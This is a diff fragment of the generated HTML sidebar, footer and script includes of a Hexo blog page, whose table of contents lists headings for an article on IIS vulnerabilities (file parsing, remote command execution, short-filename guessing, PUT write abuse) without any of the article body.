+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          <div id="music163player">
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=586299&auto=1&height=66"></iframe>
+</div>
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、IIS文件解析漏洞"><span class="nav-number">1.</span> <span class="nav-text">一、IIS文件解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-IIS-6-0的文件解析漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">1. IIS 6.0的文件解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-IIS-7-5文件解析漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">2. IIS 7.5文件解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-漏洞修复"><span class="nav-number">1.3.</span> <span class="nav-text">3. 漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补充："><span class="nav-number">1.4.</span> <span class="nav-text">补充：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS远程命令执行漏洞"><span class="nav-number">2.</span> <span class="nav-text">IIS远程命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS短文件名猜解"><span class="nav-number">3.</span> <span class="nav-text">IIS短文件名猜解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-1"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复-1"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#局限性"><span class="nav-number">3.4.</span> <span class="nav-text">局限性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT-对IIS写权限的利用"><span class="nav-number">4.</span> <span class="nav-text">PUT(对IIS写权限的利用)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理-2"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-2"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复-2"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wenz1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+
+<!-- 页面点击小红心 -->
+<!-- <script type="text/javascript" src="/js/src/love.js"></script> -->
+
+</html>
